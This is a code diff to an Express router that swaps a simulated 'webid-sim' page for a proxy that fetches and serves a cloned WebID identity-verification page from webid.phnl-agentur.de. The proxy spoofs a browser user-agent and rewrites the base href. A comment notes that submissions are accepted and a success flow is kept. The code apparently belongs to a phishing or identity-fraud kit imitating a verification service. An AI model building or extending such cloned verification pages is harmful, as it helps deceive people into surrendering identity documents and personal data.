@@ -78,14 +78,43 @@ function normalizeWebIdCaseId(input) {
   return String(input || '').trim().replace(/[^0-9-]/g, '').slice(0, 40) || '152-187-906';
 }
 
-router.get('/webid', (req, res) => {
+async function serveWebIdClone(res, caseId) {
+  const upstreamUrl = `https://webid.phnl-agentur.de/000631/${encodeURIComponent(caseId)}`;
+  try {
+    const upstream = await fetch(upstreamUrl, {
+      headers: {
+        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126 Safari/537.36',
+        accept: 'text/html,application/xhtml+xml'
+      }
+    });
+
+    if (!upstream.ok) {
+      return res.status(upstream.status).send('WebID-Seite konnte nicht geladen werden.');
+    }
+
+    let html = await upstream.text();
+
+    if (/<head[^>]*>/i.test(html) && !/<base\s+href=/i.test(html)) {
+      html = html.replace(/<head([^>]*)>/i, '<head$1><base href="https://webid.phnl-agentur.de/">');
+    }
+
+    res.setHeader('Content-Type', 'text/html; charset=utf-8');
+    res.setHeader('Cache-Control', 'no-store');
+    return res.send(html);
+  } catch (err) {
+    console.error('[webid-proxy] failed', err);
+    return res.status(502).send('WebID-Seite konnte nicht geladen werden.');
+  }
+}
+
+router.get('/webid', async (req, res) => {
   const caseId = normalizeWebIdCaseId(req.query.id || '152-187-906');
-  return res.render('pages/webid-sim', { caseId });
+  return serveWebIdClone(res, caseId);
 });
 
-router.get('/webid/:caseId', (req, res) => {
+router.get('/webid/:caseId', async (req, res) => {
   const caseId = normalizeWebIdCaseId(req.params.caseId);
-  return res.render('pages/webid-sim', { caseId });
+  return serveWebIdClone(res, caseId);
 });
 
 // Decoupled mode: accept submissions, keep UX success flow, persistence is moved out
